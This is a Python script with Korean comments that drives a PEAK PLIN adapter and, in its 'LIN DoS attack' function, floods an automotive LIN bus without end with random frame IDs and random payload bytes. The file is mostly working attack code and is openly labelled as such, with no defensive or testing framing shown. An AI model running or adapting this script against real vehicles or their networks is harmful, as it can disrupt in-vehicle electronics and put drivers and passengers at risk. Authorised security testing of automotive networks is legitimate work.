from PLinApi import *
from ctypes import c_ushort, byref, sizeof, create_string_buffer
import time
import random

# PLIN API 객체 생성
LIN = PLinApi()

# LIN 클라이언트 등록
client_name = "MyLINClient"
hWnd = 0
hClient = HLINCLIENT()

register_result = LIN.RegisterClient(client_name, hWnd, hClient)
if register_result == TLIN_ERROR_OK:
    print("Client registered successfully with handle: ", hClient.value)
else:
    print("Failed to register client. Error code: ", register_result)
    exit()

# 사용 가능한 하드웨어 가져오기
num_hw = c_ushort()
hardware_buffer = (HLINHW * 10)()

avail_result = LIN.GetAvailableHardware(hardware_buffer, sizeof(hardware_buffer), num_hw)

if avail_result != TLIN_ERROR_OK:
    print(f"Failed to get available hardware. Error code: {avail_result}")
else:
    print(f"Number of Available Hardware: {num_hw.value}")

    if num_hw.value > 0:
        for i in range(num_hw.value):
            print(f"Hardware {i + 1} Handle: {hardware_buffer[i]}")
    else:
        print("No hardware available.")
    hHw = hardware_buffer[0]

# 클라이언트와 하드웨어 연결
connect_result = LIN.ConnectClient(hClient, hHw)
if connect_result == TLIN_ERROR_OK:
    print("Success Connection!!")
else:
    print("Failed to connect. Error code: ", connect_result)
    exit()

# 하드웨어 초기화
language_id = 0
error_text_buffer = create_string_buffer(256)
master = TLIN_HARDWAREMODE_MASTER
slave = TLIN_HARDWAREMODE_SLAVE

init_result = LIN.InitializeHardware(hClient, hHw, slave, 19200)
if init_result != TLIN_ERROR_OK:
    print("Failed to initialize hardware.")
    LIN.GetErrorText(init_result, language_id, error_text_buffer, len(error_text_buffer))
    print(error_text_buffer.value)
    exit()
else:
    print("Hardware Initialized Successfully!")

# LIN DoS 공격
def lin_dos_attack():
    print("Starting LIN DoS attack...")
    try:
        while True:  # 지속적으로 메시지 전송
            msg_id = random.randint(0x00, 0x3F)  # 무작위 메시지 ID (0~63)
            length = random.randint(1, 8)  # 데이터 길이 (1~8 바이트)
            data = [random.randint(0x00, 0xFF) for _ in range(length)]  # 무작위 데이터 생성

            IFrameEntry = TLINFrameEntry()
            IFrameEntry.FrameId = msg_id
            IFrameEntry.Length = length
            IFrameEntry.Direction = TLIN_DIRECTION_PUBLISHER
            IFrameEntry.ChecksumType = TLIN_CHECKSUMTYPE_ENHANCED
            IFrameEntry.Flags = FRAME_FLAG_RESPONSE_ENABLE

            LIN.SetFrameEntry(hClient, hHw, IFrameEntry)

            c_data_array = (c_ubyte * length)(*data)
            result = LIN.UpdateByteArray(hClient, hHw, IFrameEntry.FrameId, 0, length, c_data_array)

            if result != TLIN_ERROR_OK:
                print(f"Error sending DoS message. Error code: {result}")

    except KeyboardInterrupt:
        print("DoS attack interrupted by user.")

# LIN DoS 공격 수행
lin_dos_attack()

# 클라이언트와 하드웨어 연결 해제
disconnect_result = LIN.DisconnectClient(hClient, hHw)
if disconnect_result == TLIN_ERROR_OK:
    print("Disconnected successfully.")
else:
    print("Failed to disconnect. Error code: ", disconnect_result)

# 클라이언트 해제
unregister_result = LIN.RemoveClient(hClient)
if unregister_result == TLIN_ERROR_OK:
    print("Client unregistered successfully.")
else:
    print("Failed to unregister client. Error code: ", unregister_result)
